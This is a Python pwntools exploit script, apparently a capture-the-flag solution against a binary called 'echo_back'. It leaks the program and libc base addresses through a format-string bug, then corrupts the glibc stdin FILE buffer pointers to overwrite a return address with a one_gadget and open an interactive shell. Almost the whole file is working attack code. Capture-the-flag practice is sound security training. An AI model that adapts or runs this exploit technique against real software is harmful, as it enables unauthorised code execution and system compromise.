#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process('./echo_back', env = {'LD_PRELOAD':'./libc.so.6'})
elf = ELF('./echo_back')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
one_gadget = 0x45216    # rax == NULL
one_gadget = 0x4526a    # [rsp+0x30] == NULL
one_gadget = 0xf02a4    # [rsp+0x50] == NULL
one_gadget = 0xf1147    # [rsp+0x70] == NULL

def echo_back(length, content):# :int ,:str 
    io.sendlineafter('>> ','2')
    io.sendlineafter('length:', str(length))
    io.sendline(content)
def setname(name):
    io.sendlineafter('>> ', '1')
    io.sendafter('name:', name)


if __name__ == '__main__':
    # experiment with local glibc (2.23)
    # leak addr by format string
    raw_input('debug?')
    echo_back(7,'%14$p')
    io.recvuntil('say:')
    elf_base = int(io.recvuntil('\n', drop = True),16) - 0xd30
    echo_back(7,'%12$p')
    io.recvuntil('say:')
    rbp_main = int(io.recvuntil('\n', drop = True),16)
    echo_back(7,'%19$p')
    io.recvuntil('say:')
    libc_base = int(io.recvuntil('\n',drop = True), 16) - libc.sym['__libc_start_main'] - 240
    success('elf base -> {:#x}'.format(elf_base))
    success('libc base -> {:#x}'.format(libc_base))

    # attack
    # make the name point to buf_base
    setname(p64(libc_base + 0x3c48e0 + 0x38).replace('\x00', ''))
    # make the low byte of buf_base be \x00
    echo_back(7, '%16$hhn')
    # move the read_ptr == read_end by getchar
 
    payload = p64(libc_base + libc.sym['_IO_2_1_stdin_']+0x83)*3
    payload += p64(rbp_main - 0x28) + p64(rbp_main+0x10)
    
    io.sendlineafter('choice>> ', '2')
    io.sendafter('length:', payload)
    io.sendline('')
    for i in range(len(payload)-1):
        io.sendlineafter('>> ', '2')
        io.sendlineafter('length', '')

    io.sendlineafter('>> ', '2')
    io.sendlineafter('length', p64(one_gadget + libc_base))
    
    io.sendline('')
    io.interactive()
    io.close()
